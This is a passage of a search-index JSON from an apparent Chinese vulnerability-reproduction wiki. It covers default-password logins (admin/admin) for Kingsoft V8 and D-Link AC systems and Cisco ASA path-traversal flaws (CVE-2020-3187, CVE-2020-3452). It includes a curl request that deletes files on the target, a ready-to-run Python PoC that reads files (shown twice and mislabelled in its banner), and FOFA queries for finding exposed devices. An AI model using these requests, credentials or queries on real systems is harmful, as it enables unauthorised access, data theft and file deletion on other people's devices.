POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-21224/#\u53c2\u8003\u6587\u7ae0","text":"https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/","text":"\u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf \u9ed8\u8ba4\u5f31\u53e3\u4ee4\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u5168\u90e8\u4e3b\u673a\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf FOFA \u00b6 [!NOTE] app=\"\u730e\u9e70\u5b89\u5168-\u91d1\u5c71V8+\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u9646\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u53e3\u4ee4\u4e3a admin/admin \u767b\u5f55\u540e\u83b7\u53d6\u5168\u90e8\u7684\u4e3b\u673a\u6743\u9650(\u5305\u62ec\u8fdb\u7a0b\u67e5\u770b\uff0c\u547d\u4ee4\u6267\u884c\u7b49) Goby & POC \u00b6 [!NOTE] Kingsoft V8 Default weak password","title":"\u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf \u9ed8\u8ba4\u5f31\u53e3\u4ee4\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#\u91d1\u5c71-v8-\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf-\u9ed8\u8ba4\u5f31\u53e3\u4ee4\u6f0f\u6d1e","text":"","title":"\u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf \u9ed8\u8ba4\u5f31\u53e3\u4ee4\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u5168\u90e8\u4e3b\u673a\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u91d1\u5c71 V8 \u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u730e\u9e70\u5b89\u5168-\u91d1\u5c71V8+\u7ec8\u7aef\u5b89\u5168\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u9646\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u53e3\u4ee4\u4e3a admin/admin \u767b\u5f55\u540e\u83b7\u53d6\u5168\u90e8\u7684\u4e3b\u673a\u6743\u9650(\u5305\u62ec\u8fdb\u7a0b\u67e5\u770b\uff0c\u547d\u4ee4\u6267\u884c\u7b49)","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] Kingsoft V8 Default weak password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/","text":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e CVE-2020-3187 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Cisco ASA Software\u548cFTD Software\u4e2d\u7684Web\u670d\u52a1\u63a5\u53e3\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u5bf9HTTP URL\u8fdb\u884c\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u53d1\u9001\u5e26\u6709\u76ee\u5f55\u904d\u5386\u5e8f\u5217\u7684\u7279\u5236HTTP\u8bf7\u6c42\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u5e76\u5220\u9664\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u4fe1\u606f\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Cisco ASA\u8bbe\u5907 Cisco FTD\u8bbe\u5907 FOFA \u00b6 [!NOTE] /+CSCOE+/ Cisco-ASA \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html \u5b58\u5728\u5219\u53ef\u80fd\u51fa\u73b0\u6b64\u6f0f\u6d1e \u4f8b\u5982\u6211\u4eec\u5220\u9664\u4e00\u5f20\u56fe\u7247 http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif \u4f7f\u7528 curl \u53d1\u9001\u8bf7\u6c42 curl -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html \u6210\u529f\u5220\u9664\u56fe\u6807","title":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e CVE-2020-3187"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/#cisco-asa\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e-cve-2020-3187","text":"","title":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e CVE-2020-3187"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Cisco ASA Software\u548cFTD Software\u4e2d\u7684Web\u670d\u52a1\u63a5\u53e3\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u5bf9HTTP URL\u8fdb\u884c\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u53d1\u9001\u5e26\u6709\u76ee\u5f55\u904d\u5386\u5e8f\u5217\u7684\u7279\u5236HTTP\u8bf7\u6c42\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u5e76\u5220\u9664\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/#\u6f0f\u6d1e\u5f71\u54cd","text":"Cisco ASA\u8bbe\u5907 Cisco FTD\u8bbe\u5907","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/#fofa","text":"[!NOTE] /+CSCOE+/ Cisco-ASA","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%20CVE-2020-3187/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html \u5b58\u5728\u5219\u53ef\u80fd\u51fa\u73b0\u6b64\u6f0f\u6d1e \u4f8b\u5982\u6211\u4eec\u5220\u9664\u4e00\u5f20\u56fe\u7247 http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif \u4f7f\u7528 curl \u53d1\u9001\u8bf7\u6c42 curl -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html \u6210\u529f\u5220\u9664\u56fe\u6807","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/","text":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2020-3452 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Cisco Adaptive Security Appliance (ASA) \u9632\u706b\u5899\u8bbe\u5907\u4ee5\u53caCisco Firepower Threat Defense (FTD)\u8bbe\u5907\u7684WEB\u7ba1\u7406\u754c\u9762\u5b58\u5728\u672a\u6388\u6743\u7684\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u548c\u8fdc\u7a0b\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u8fdb\u884c\u76ee\u5f55\u904d\u5386\u653b\u51fb\u5e76\u8bfb\u53d6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u6587\u4ef6\uff0c\u6b64\u6f0f\u6d1e\u4e0d\u80fd\u7528\u4e8e\u83b7\u53d6\u5bf9ASA\u6216FTD\u7cfb\u7edf\u6587\u4ef6\u6216\u5e95\u5c42\u64cd\u4f5c\u7cfb\u7edf(OS)\u6587\u4ef6\u7684\u8bbf\u95ee\uff0c\u6240\u4ee5\u53ea\u80fd\u8bfb\u53d6web\u7cfb\u7edf\u76ee\u5f55\u7684\u6587\u4ef6\uff0c\u6bd4\u5982webvpn\u7684\u914d\u7f6e\u6587\u4ef6\u3001\u4e66\u7b7e\u3001\u7f51\u7edccookies\u3001\u90e8\u5206\u7f51\u7edc\u5185\u5bb9\u548c\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\u7f51\u5740\u7b49\u4fe1\u606f\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Cisco ASA\u8bbe\u5907 Cisco FTD\u8bbe\u5907 FOFA \u00b6 [!NOTE] /+CSCOE+/ Cisco-ASA \u6f0f\u6d1e\u590d\u73b0 \u00b6 POC\u5982\u4e0b https://xxx.xxx.xxx.xxx/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ \u4f1a\u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import urllib3 def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Cisco \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vnln_url = target_url + \"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\" } urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) response = requests . get ( url = vnln_url , headers = headers , verify = False , timeout = 20 ) if \"Bad Request\" in response . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u4fee\u590d \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a \\n\\033 [0m\" , response . text ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2020-3452"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#cisco-asa\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e-cve-2020-3452","text":"","title":"CISCO ASA\u8bbe\u5907\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2020-3452"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Cisco Adaptive Security Appliance (ASA) \u9632\u706b\u5899\u8bbe\u5907\u4ee5\u53caCisco Firepower Threat Defense (FTD)\u8bbe\u5907\u7684WEB\u7ba1\u7406\u754c\u9762\u5b58\u5728\u672a\u6388\u6743\u7684\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u548c\u8fdc\u7a0b\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u8fdb\u884c\u76ee\u5f55\u904d\u5386\u653b\u51fb\u5e76\u8bfb\u53d6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u6587\u4ef6\uff0c\u6b64\u6f0f\u6d1e\u4e0d\u80fd\u7528\u4e8e\u83b7\u53d6\u5bf9ASA\u6216FTD\u7cfb\u7edf\u6587\u4ef6\u6216\u5e95\u5c42\u64cd\u4f5c\u7cfb\u7edf(OS)\u6587\u4ef6\u7684\u8bbf\u95ee\uff0c\u6240\u4ee5\u53ea\u80fd\u8bfb\u53d6web\u7cfb\u7edf\u76ee\u5f55\u7684\u6587\u4ef6\uff0c\u6bd4\u5982webvpn\u7684\u914d\u7f6e\u6587\u4ef6\u3001\u4e66\u7b7e\u3001\u7f51\u7edccookies\u3001\u90e8\u5206\u7f51\u7edc\u5185\u5bb9\u548c\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\u7f51\u5740\u7b49\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#\u5f71\u54cd\u7248\u672c","text":"Cisco ASA\u8bbe\u5907 Cisco FTD\u8bbe\u5907","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#fofa","text":"[!NOTE] /+CSCOE+/ Cisco-ASA","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#\u6f0f\u6d1e\u590d\u73b0","text":"POC\u5982\u4e0b https://xxx.xxx.xxx.xxx/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ \u4f1a\u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Cisco/CISCO%20ASA%E8%AE%BE%E5%A4%87%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-3452/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import urllib3 def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Cisco \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vnln_url = target_url + \"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\" } urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) response = requests . get ( url = vnln_url , headers = headers , verify = False , timeout = 20 ) if \"Bad Request\" in response . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u4fee\u590d \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a \\n\\033 [0m\" , response . text ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/","text":"D-Link AC\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 D-Link AC\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\uff0c\u53ef\u88ab\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] D-Link AC\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] \"AC\u96c6\u4e2d\u7ba1\u7406\u5e73\u53f0\" && body=\"D-Link\u8def\u7531\u5668\u7ba1\u7406\u9875\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9ed8\u8ba4\u53e3\u4ee4\u4e3a admin:admin Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d D_Link_AC_Centralized_management_system__Default_weak_password.json","title":"\u6f0f\u6d1e\u590d\u73b0/\u7f51\u7edc\u8bbe\u5907\u6f0f\u6d1e/D-Link/D-Link AC\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#d-link-ac\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801","text":"","title":"D-Link AC\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#\u6f0f\u6d1e\u63cf\u8ff0","text":"D-Link AC\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\uff0c\u53ef\u88ab\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] D-Link AC\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#fofa","text":"[!NOTE] \"AC\u96c6\u4e2d\u7ba1\u7406\u5e73\u53f0\" && 